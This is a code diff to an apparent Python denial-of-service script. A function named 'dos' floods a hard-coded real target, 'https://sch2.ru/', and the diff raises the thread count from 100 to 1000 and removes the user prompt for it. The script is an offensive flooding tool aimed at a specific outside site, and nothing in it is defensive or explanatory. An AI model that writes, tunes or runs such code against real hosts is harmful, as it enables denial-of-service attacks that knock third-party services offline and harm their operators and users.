@@ -12,14 +12,9 @@ def dos(target):
             print(colorama.Fore.RED + "[+] " + colorama.Fore.LIGHTGREEN_EX + "Connection error!")
 
 
-threads = 100
+threads = 1000
 
 url = "https://sch2.ru/"
-
-try:
-    threads = int(input("Threads: "))
-except ValueError:
-    exit("Threads count is incorrect!")
 
 if threads == 0:
     exit("Threads count is incorrect!")
